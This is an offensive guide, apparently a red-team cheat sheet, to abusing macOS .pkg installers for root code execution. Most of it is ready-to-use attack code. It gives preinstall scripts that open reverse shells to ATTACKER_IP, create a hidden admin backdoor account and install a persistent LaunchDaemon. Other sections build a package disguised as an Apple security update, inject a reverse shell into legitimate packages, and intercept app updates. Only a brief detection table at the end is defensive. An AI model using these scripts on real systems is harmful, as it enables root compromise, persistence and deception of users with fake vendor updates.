# macOS Package Installer Exploitation

Abuse `.pkg` installers and the macOS Installer framework for privilege escalation and code execution.

**MITRE ATT&CK**: T1546.016 — Installer Packages

---

## How It Works

macOS `.pkg` files can contain pre/post-install scripts that run as **root** during installation. The Installer.app requests admin credentials, then executes all embedded scripts with root privileges.

---

## 1. Malicious .pkg with Preinstall/Postinstall Scripts

### Create the Payload Scripts

```bash
#!/bin/bash
# scripts/preinstall — runs BEFORE file installation, as root

# Reverse shell
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &

# Or: add backdoor user
dscl . -create /Users/backdoor
dscl . -create /Users/backdoor UserShell /bin/bash
dscl . -create /Users/backdoor UniqueID 505
dscl . -create /Users/backdoor PrimaryGroupID 20
dscl . -create /Users/backdoor NFSHomeDirectory /Users/backdoor
dscl . -passwd /Users/backdoor password123
dscl . -append /Groups/admin GroupMembership backdoor

# Or: install persistence
cat > /Library/LaunchDaemons/com.update.agent.plist << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.update.agent</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>-c</string>
        <string>bash -i >&#38; /dev/tcp/ATTACKER_IP/4444 0>&#38;1</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
EOF
chmod 644 /Library/LaunchDaemons/com.update.agent.plist
launchctl load /Library/LaunchDaemons/com.update.agent.plist

exit 0  # Must exit 0 or installation "fails" visibly
```

### Build the Package

```bash
# Create package structure
mkdir -p /tmp/pkg_build/{scripts,payload}
echo "Placeholder" > /tmp/pkg_build/payload/.placeholder

# Add scripts (must be named exactly preinstall/postinstall)
cp preinstall.sh /tmp/pkg_build/scripts/preinstall
cp postinstall.sh /tmp/pkg_build/scripts/postinstall
chmod +x /tmp/pkg_build/scripts/*

# Build with pkgbuild
pkgbuild \
    --identifier com.legitimate-looking.update \
    --version 1.0 \
    --scripts /tmp/pkg_build/scripts \
    --root /tmp/pkg_build/payload \
    --install-location /tmp/.pkg_install \
    /tmp/update.pkg
```

### Build with productbuild (Distribution Package — looks more legitimate)

```bash
# Create distribution.xml
cat > /tmp/distribution.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="2">
    <title>Security Update 2024-001</title>
    <welcome file="welcome.html"/>
    <background file="background.png" alignment="bottomleft"/>
    <pkg-ref id="com.apple.security.update.2024001">
        <bundle-version/>
    </pkg-ref>
    <options customize="never" require-scripts="false"/>
    <choices-outline>
        <line choice="default">
            <line choice="com.apple.security.update.2024001"/>
        </line>
    </choices-outline>
    <choice id="default"/>
    <choice id="com.apple.security.update.2024001" visible="false">
        <pkg-ref id="com.apple.security.update.2024001"/>
    </choice>
    <pkg-ref id="com.apple.security.update.2024001" version="1.0" onConclusion="none">update.pkg</pkg-ref>
</installer-gui-script>
EOF

# Wrap the component package
productbuild \
    --distribution /tmp/distribution.xml \
    --package-path /tmp/ \
    /tmp/SecurityUpdate2024-001.pkg
```

---

## 2. Installer Plugin Injection

macOS Installer supports plugins (`.bundle`) in the `Plugins` directory of a `.pkg`. These run custom code in the Installer.app context.

```bash
# Installer plugins are Cocoa bundles loaded by Installer.app
# They run as the user (not root), but in the Installer.app context
# which may have elevated privileges during installation

# Check existing packages for plugins:
pkgutil --expand /path/to/package.pkg /tmp/expanded
ls /tmp/expanded/Plugins/
```

---

## 3. Exploiting Existing .pkg Files

### Intercept Update Packages
```bash
# Many apps download .pkg updates over HTTP or without signature verification
# MitM the download and replace with a malicious .pkg

# Check update mechanisms:
# 1. Sparkle framework updates (look for SUFeedURL in Info.plist)
defaults read /Applications/TargetApp.app/Contents/Info.plist SUFeedURL 2>/dev/null

# 2. Custom update URLs in app preferences
defaults read com.targetapp.preferences 2>/dev/null | grep -i "update\|url\|download"
```

### Modify Existing Packages
```bash
# Expand a legitimate .pkg
pkgutil --expand /path/to/legit.pkg /tmp/expanded

# Inject into preinstall/postinstall scripts
echo 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1 &' >> /tmp/expanded/Scripts/postinstall

# Repackage
pkgutil --flatten /tmp/expanded /tmp/modified.pkg
```

---

## 4. Authorization Rights Escalation

The Installer.app uses the authorization framework. Custom rights can be weaker than expected.

```bash
# Check installer-related authorization rights
security authorizationdb read system.install.software
security authorizationdb read system.install.apple-software

# If a right is set to "allow" instead of "authenticate-admin":
# No password prompt for installation
```

---

## 5. Command-Line Installation (No GUI)

```bash
# Install a .pkg silently (requires sudo or pre-cached credentials)
sudo installer -pkg /path/to/evil.pkg -target /

# Install to a specific volume
sudo installer -pkg /path/to/evil.pkg -target /Volumes/TargetDisk

# The scripts run as root regardless of -target
```

---

## Detection

| Indicator | Where to Check |
|-----------|---------------|
| Unexpected .pkg installations | `/var/log/install.log` |
| New LaunchDaemons after install | `/Library/LaunchDaemons/` |
| Installer receipts | `/var/db/receipts/` |
| Package scripts | `pkgutil --expand pkg /tmp/out && cat /tmp/out/Scripts/*` |
| Gatekeeper bypass | `spctl --assess -v /path/to/package.pkg` |
